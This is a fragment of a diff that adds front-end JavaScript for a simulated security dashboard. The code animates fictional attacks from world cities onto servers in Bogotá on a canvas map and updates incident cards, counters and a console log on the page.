+            // North America
+            [[0.10, 0.20], [0.22, 0.15], [0.38, 0.25], [0.32, 0.45], [0.26, 0.50], [0.20, 0.45], [0.15, 0.35]],
+            // South America
+            [[0.28, 0.55], [0.35, 0.58], [0.38, 0.72], [0.32, 0.88], [0.29, 0.85], [0.27, 0.70]],
+            // Africa
+            [[0.48, 0.48], [0.55, 0.46], [0.60, 0.54], [0.58, 0.72], [0.53, 0.80], [0.49, 0.70], [0.46, 0.58]],
+            // Europe
+            [[0.46, 0.22], [0.56, 0.18], [0.60, 0.30], [0.52, 0.38], [0.45, 0.35]],
+            // Asia
+            [[0.58, 0.18], [0.85, 0.15], [0.90, 0.35], [0.82, 0.55], [0.72, 0.60], [0.66, 0.45], [0.58, 0.30]],
+            // Australia
+            [[0.80, 0.70], [0.88, 0.72], [0.86, 0.82], [0.81, 0.80]]
+        ];
+
+        const attackPoints = {
+            'Bogota': { x: 0.30, y: 0.65, color: '#3b82f6', isTarget: true }, // Main defender Hub
+            'Moscow': { x: 0.62, y: 0.28, color: '#ff003c' },
+            'Shenzhen': { x: 0.78, y: 0.48, color: '#ff003c' },
+            'London': { x: 0.48, y: 0.32, color: '#f97316' },
+            'New York': { x: 0.25, y: 0.35, color: '#f97316' },
+            'Tokyo': { x: 0.85, y: 0.38, color: '#ff003c' },
+            'Sydney': { x: 0.88, y: 0.78, color: '#f97316' },
+            'Frankfurt': { x: 0.51, y: 0.34, color: '#f97316' }
+        };
+
+        const currentLaserBeams = [];
+        const impactRipples = [];
+
+        function simulateMapAttack(sourceIp, targetNodeId, threatType) {
+            const cities = Object.keys(attackPoints).filter(c => c !== 'Bogota');
+            const sourceCity = cities[Math.floor(Math.random() * cities.length)];
+            
+            // Check if source IP is blacklisted in perimeter firewall
+            if(state.blockedIps.has(sourceIp)) {
+                state.threatsBlocked++;
+                document.getElementById('map-counter').innerText = state.threatsBlocked.toLocaleString();
+                showTerminalOutput(`[+] Packet Dropped: Perimeter Firewall blocked payload from ${sourceIp} targeting node '${targetNodeId}'.`, 'text-emerald-400');
+                return;
+            }
+
+            // Fire laser animation
+            const beam = {
+                source: sourceCity,
+                target: 'Bogota',
+                targetNode: targetNodeId,
+                progress: 0,
+                speed: 0.012 + Math.random() * 0.015,
+                color: attackPoints[sourceCity].color,
+                ip: sourceIp,
+                type: threatType
+            };
+
+            currentLaserBeams.push(beam);
+            playSound.laser();
+        }
+
+        function onLaserImpact(beam) {
+            const server = state.servers[beam.targetNode];
+            const t = vsocTranslations[currentLang];
+
+            // Trigger ripple ring animation
+            impactRipples.push({
+                x: attackPoints['Bogota'].x * mapWidth,
+                y: attackPoints['Bogota'].y * mapHeight,
+                radius: 1,
+                maxRadius: 28,
+                color: server.shielded ? '#3b82f6' : '#ff003c',
+                opacity: 1.0
+            });
+
+            if (server.shielded) {
+                // Protected by node shield
+                state.threatsBlocked++;
+                document.getElementById('map-counter').innerText = state.threatsBlocked.toLocaleString();
+                playSound.success();
+                showTerminalOutput(`[+] Shield Integrity: Host ${server.name} absorbed intrusion from ${beam.ip} with Active Quantum Shield.`, 'text-blue-400');
+            } else {
+                // Compromise server
+                server.status = 'compromised';
+                server.load = 99;
+                playSound.alarm();
+                
+                // SVG elements status compromise color changes
+                document.getElementById(`node-${beam.targetNode}`).setAttribute('stroke', '#ff003c');
+                document.getElementById(`node-${beam.targetNode}`).classList.add('animate-pulse');
+                document.getElementById(`status-${beam.targetNode}`).setAttribute('fill', '#ff003c');
+                document.getElementById(`link-${beam.targetNode}`).setAttribute('stroke', 'rgba(255, 0, 60, 0.4)');
+                
+                showTerminalOutput(`[!] BREACH: Server Node '${beam.targetNode}' (${server.name}) is COMPROMISED by intrusion IP ${beam.ip}!`, 'text-red-500');
+
+                // Trigger active incident card
+                const randomIncidentId = `INC-2024-000${Math.floor(Math.random() * 90) + 10}`;
+                state.activeIncidents.unshift({
+                    id: randomIncidentId,
+                    title: `Intrusión crítica en ${server.name}`,
+                    severity: 'CRITICAL',
+                    status: 'new',
+                    time: new Date().toLocaleTimeString().slice(0, 5),
+                    nodeId: beam.targetNode
+                });
+
+                updateSummaryCounts();
+                recalcIntegrity();
+                renderActiveIncidentCards();
+
+                if (selectedNodeId === beam.targetNode) renderNodeDetails(beam.targetNode);
+
+                // Toast status popup warning
+                Swal.fire({
+                    toast: true,
+                    position: 'top-end',
+                    icon: 'warning',
+                    title: t.alertSystemUnderAttack.replace('{name}', server.name),
+                    showConfirmButton: false,
+                    timer: 4500,
+                    background: '#0d1222',
+                    color: '#fff',
+                    customClass: {
+                        popup: 'border border-red-500/20 shadow-red-500/5'
+                    }
+                });
+            }
+        }
+
+        function drawThreatMap() {
+            if (activeTab !== 'general') {
+                requestAnimationFrame(drawThreatMap);
+                return; // Disable rendering computation if tab is inactive
+            }
+            mapCtx.clearRect(0, 0, mapWidth, mapHeight);
+
+            // Draw hacker background grid
+            mapCtx.strokeStyle = 'rgba(255, 255, 255, 0.012)';
+            mapCtx.lineWidth = 1;
+            mapCtx.beginPath();
+            const gridSpacing = 24;
+            for(let i = 0; i < mapWidth; i += gridSpacing) {
+                mapCtx.moveTo(i, 0);
+                mapCtx.lineTo(i, mapHeight);
+            }
+            for(let j = 0; j < mapHeight; j += gridSpacing) {
+                mapCtx.moveTo(0, j);
+                mapCtx.lineTo(mapWidth, j);
+            }
+            mapCtx.stroke();
+
+            // Draw custom vector landmass outlines
+            mapCtx.fillStyle = 'rgba(59, 130, 246, 0.015)';
+            mapCtx.strokeStyle = 'rgba(59, 130, 246, 0.04)';
+            mapCtx.lineWidth = 1.2;
+            
+            continentPolys.forEach(poly => {
+                mapCtx.beginPath();
+                poly.forEach((pt, index) => {
+                    const px = pt[0] * mapWidth;
+                    const py = pt[1] * mapHeight;
+                    if (index === 0) mapCtx.moveTo(px, py);
+                    else mapCtx.lineTo(px, py);
+                });
+                mapCtx.closePath();
+                mapCtx.fill();
+                mapCtx.stroke();
+            });
+
+            // Draw target concentric defense radar rings on Bogotá
+            const targetX = attackPoints['Bogota'].x * mapWidth;
+            const targetY = attackPoints['Bogota'].y * mapHeight;
+            mapCtx.strokeStyle = 'rgba(59, 130, 246, 0.05)';
+            mapCtx.lineWidth = 1.2;
+            mapCtx.beginPath();
+            mapCtx.arc(targetX, targetY, 35, 0, Math.PI * 2);
+            mapCtx.arc(targetX, targetY, 75, 0, Math.PI * 2);
+            mapCtx.arc(targetX, targetY, 120, 0, Math.PI * 2);
+            mapCtx.stroke();
+
+            // Draw city target points
+            for(const city in attackPoints) {
+                const pt = attackPoints[city];
+                const x = pt.x * mapWidth;
+                const y = pt.y * mapHeight;
+
+                mapCtx.fillStyle = pt.color;
+                mapCtx.beginPath();
+                mapCtx.arc(x, y, pt.isTarget ? 5.5 : 3.5, 0, Math.PI*2);
+                mapCtx.fill();
+
+                // Dotted pulse on target site
+                if (pt.isTarget) {
+                    mapCtx.strokeStyle = pt.color + '40';
+                    mapCtx.lineWidth = 1;
+                    mapCtx.beginPath();
+                    mapCtx.arc(x, y, 9 + Math.sin(Date.now() / 200) * 3, 0, Math.PI*2);
+                    mapCtx.stroke();
+                }
+
+                // Node labels
+                mapCtx.fillStyle = 'rgba(148, 163, 184, 0.6)';
+                mapCtx.font = '8px monospace';
+                mapCtx.fillText(city, x + 8, y + 3);
+            }
+
+            // Draw and update active laser beams
+            for (let i = currentLaserBeams.length - 1; i >= 0; i--) {
+                const b = currentLaserBeams[i];
+                const srcPt = attackPoints[b.source];
+                const tgtPt = attackPoints[b.target];
+
+                const sx = srcPt.x * mapWidth;
+                const sy = srcPt.y * mapHeight;
+                const tx = tgtPt.x * mapWidth;
+                const ty = tgtPt.y * mapHeight;
+
+                // Bezier curve calculations for curved cyber arcs
+                const cx1 = sx + (tx - sx) * 0.25;
+                const cy1 = sy + (ty - sy) * 0.25 - 40; // curve upwards
+                const cx2 = sx + (tx - sx) * 0.75;
+                const cy2 = sy + (ty - sy) * 0.75 - 40;
+
+                const t = b.progress;
+                
+                // Cubic Bezier interpolation
+                const px = Math.pow(1-t, 3)*sx + 3*Math.pow(1-t, 2)*t*cx1 + 3*(1-t)*Math.pow(t, 2)*cx2 + Math.pow(t, 3)*tx;
+                const py = Math.pow(1-t, 3)*sy + 3*Math.pow(1-t, 2)*t*cy1 + 3*(1-t)*Math.pow(t, 2)*cy2 + Math.pow(t, 3)*ty;
+
+                // Draw full path arc
+                mapCtx.strokeStyle = b.color + '18';
+                mapCtx.lineWidth = 1.2;
+                mapCtx.beginPath();
+                mapCtx.moveTo(sx, sy);
+                mapCtx.bezierCurveTo(cx1, cy1, cx2, cy2, tx, ty);
+                mapCtx.stroke();
+
+                // Draw laser head particle
+                mapCtx.fillStyle = '#ffffff';
+                mapCtx.shadowColor = b.color;
+                mapCtx.shadowBlur = 6;
+                mapCtx.beginPath();
+                mapCtx.arc(px, py, 2.5, 0, Math.PI*2);
+                mapCtx.fill();
+                mapCtx.shadowBlur = 0; // reset shadow
+
+                b.progress += b.speed;
+                if(b.progress >= 1.0) {
+                    onLaserImpact(b);
+                    currentLaserBeams.splice(i, 1);
+                }
+            }
+
+            // Draw impact ripples
+            for (let j = impactRipples.length - 1; j >= 0; j--) {
+                const r = impactRipples[j];
+                mapCtx.strokeStyle = r.color;
+                mapCtx.lineWidth = 1.8;
+                mapCtx.globalAlpha = r.opacity;
+                mapCtx.beginPath();
+                mapCtx.arc(r.x, r.y, r.radius, 0, Math.PI*2);
+                mapCtx.stroke();
+                mapCtx.globalAlpha = 1.0; // restore
+
+                r.radius += 1.5;
+                r.opacity -= 0.04;
+
+                if(r.opacity <= 0) {
+                    impactRipples.splice(j, 1);
+                }
+            }
+
+            requestAnimationFrame(drawThreatMap);
+        }
+
+        // --- ON LOAD AND TICKERS ---
+        window.addEventListener('resize', () => {
+            resizeMapCanvas();
+            drawAllSparklines();
+        });
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const lang = localStorage.getItem('preferredLang') || 'es';
+            changeLang(lang);
+
+            // Setup clock ticker
+            setInterval(() => {
+                const clockEl = document.getElementById('header-clock');
+                if(clockEl) {
+                    const now = new Date();
+                    const time = now.toLocaleTimeString();
+                    const day = String(now.getDate()).padStart(2, '0');
+                    const month = String(now.getMonth() + 1).padStart(2, '0');
+                    const year = now.getFullYear();
+                    clockEl.innerHTML = `${time} &nbsp;&nbsp; ${day}/${month}/${year}`;
+                }
+            }, 1000);
+
+            // Audio Context initialization on first gesture click
+            window.addEventListener('click', () => {
+                initAudio();
+            }, { once: true });
+
+            // Initialize charts and drawings
+            resizeMapCanvas();
+            drawAllSparklines();
+            initCharts();
+            updateSummaryCounts();
+            recalcIntegrity();
+            renderRecentAlertsTable();
+            renderActiveIncidentCards();
+
+            // Run threat map loop
+            requestAnimationFrame(drawThreatMap);
+
+            // Set dynamic threat logging intervals (every 2.5s)
+            setInterval(generateLog, 2500);
+
+            // Pre-populate console screen manual help
+            const t = vsocTranslations[currentLang];
+            showTerminalOutput(t.consoleInit, 'text-blue-400');
+            
+            // Auto generate initial entries
+            for(let i=0; i<3; i++) {
+                generateLog();
+            }
+
+            lucide.createIcons();
+        });
+    </script>
+</body>
+</html>
